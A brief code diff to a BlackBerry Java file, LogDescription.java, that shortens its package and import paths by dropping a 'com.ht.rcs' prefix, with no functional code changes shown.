@@ -5,11 +5,11 @@
  * File         : LogDescription.java 
  * Created      : 26-mar-2010
  * *************************************************/
-package com.ht.rcs.blackberry.log;
+package blackberry.log;
 
 import net.rim.device.api.util.DataBuffer;
 
-import com.ht.rcs.blackberry.utils.Check;
+import blackberry.utils.Check;
 
 public class LogDescription {
     public int version;
